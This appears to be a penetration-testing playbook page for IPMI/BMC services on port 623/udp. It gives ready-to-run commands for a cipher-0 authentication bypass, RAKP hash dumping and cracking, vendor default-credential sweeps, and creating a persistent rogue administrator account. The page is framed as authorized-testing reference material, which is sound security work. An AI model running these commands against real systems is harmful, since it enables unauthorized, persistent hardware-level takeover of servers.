---
service: ipmi
title: IPMI / BMC
ports: 623
protocol: udp
aliases: ipmi2, bmc, idrac, ilo, imm
---

# IPMI — quick wins

**When you see it:** 623/udp open (IPMI) — the BMC is on the network. Any of the three
paths below (cipher-0 bypass, RAKP hash dump, or default creds) can yield root-level BMC
access, and from there a host-power cycle or SoL console that bypasses the OS entirely.

> Authorized testing only. Triage is read-only; steps marked ✏️ write to the target — BMC
> changes are persistent across reboots and OS reinstalls; clean up (restore passwords,
> disable created accounts) thoroughly.

## Triage (read-only)
```sh
sudo nmap -sU -p 623 --script ipmi-version H      # confirm IPMI + version
sudo nmap -sU -p 623 --script ipmi-cipher-zero H  # probe cipher-0 auth bypass
ipmitool -I lanplus -H H -U '' -P '' user list 2>/dev/null  # anonymous probe
```

## Quick wins

### Cipher-0 auth bypass — login with any password
```sh
# confirm with nmap first (see Triage), then:
ipmitool -I lanplus -C 0 -H H -U ADMIN -P anything user list
```
*Why:* IPMI 2.0 cipher suite 0 means "no integrity check"; the server accepts any password
for a valid username. Documented by Dan Farmer; affects HP, Dell, Supermicro BMCs and most
other IPMI 2.0 implementations. Replace `ADMIN` with the vendor default username (see table
in Gotchas).

### RAKP hash dump → offline crack
```sh
# Metasploit: dump HMAC-SHA1 challenge hashes for all users
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes
msf6 auxiliary(ipmi_dumphashes) > set RHOSTS H
msf6 auxiliary(ipmi_dumphashes) > set OUTPUT_FILE /tmp/ipmi-hashes.txt
msf6 auxiliary(ipmi_dumphashes) > run

# crack with hashcat (mode 7300 = IPMI 2.0 RAKP HMAC-SHA1)
hashcat -m 7300 /tmp/ipmi-hashes.txt /usr/share/wordlists/rockyou.txt
```
*Why:* the RAKP authentication handshake reveals a per-user HMAC-SHA1 hash to any client
that initiates a session — no prior auth needed. Recovered plaintext passwords work against
the BMC web UI, SSH (if enabled), and the IPMI lan interface.

### Default credentials
```sh
# try vendor defaults before anything else
ipmitool -I lanplus -H H -U root    -P calvin    user list   # Dell iDRAC
ipmitool -I lanplus -H H -U ADMIN   -P ADMIN     user list   # Supermicro
ipmitool -I lanplus -H H -U USERID  -P PASSW0RD  user list   # IBM IMM
ipmitool -I lanplus -H H -U Administrator -P ""  user list   # HP iLO (randomised — less likely)
```
*Why:* factory defaults are frequently left unchanged, especially on out-of-band management
interfaces that staff rarely log into.

### BMC password reset / account creation ✏️
```sh
# once you have auth (cipher-0 or cracked creds):
ipmitool -I lanplus -C 0 -H H -U ADMIN -P anything user set password 2 NewP@ss123
# or create a new admin account (user ID 3):
ipmitool -I lanplus -C 0 -H H -U ADMIN -P anything user set name     3 pwned
ipmitool -I lanplus -C 0 -H H -U ADMIN -P anything user set password 3 NewP@ss123
ipmitool -I lanplus -C 0 -H H -U ADMIN -P anything user priv         3 4  # 4 = ADMINISTRATOR
ipmitool -I lanplus -C 0 -H H -U ADMIN -P anything user enable       3
```
*Why:* BMC admin access gives serial-over-LAN (SoL) console to the host OS, virtual media
mount, and power control — effectively physical-level access over the network.

## aranum helpers
- `aranumtoolkit/network/enum-ipmi.sh` — dispatcher that produced this finding (version,
  cipher-0 probe, anonymous user list, vendor default sweep).

## Gotchas
- `-I lanplus` requires IPMI 2.0; use `-I lan` for IPMI 1.5 targets (older gear).
- The `ipmi_dumphashes` module sends a session-open packet per user ID (1–30 by default);
  this is visible in BMC logs — it's not stealthy.
- HP iLO passwords are randomized at the factory and printed on a sticker; cipher-0 and
  RAKP dump are the reliable paths there.
- IPMI over LAN is sometimes firewalled to a dedicated management VLAN; if 623/udp is not
  reachable from the test network, check for a web BMC UI on 443/80 (iDRAC, iLO, IPMI web)
  and pivot through it instead.
- After a successful password reset, the original password is gone — coordinate with the
  client before running ✏️ steps.

## Sources
- Rapid7 "A Penetration Tester's Guide to IPMI and BMCs"; HackTricks `623-udp-ipmi`;
  Hackviser IPMI; amandaguglieri hackinglife IPMI; Dan Farmer "Sold Down the River" (2013).
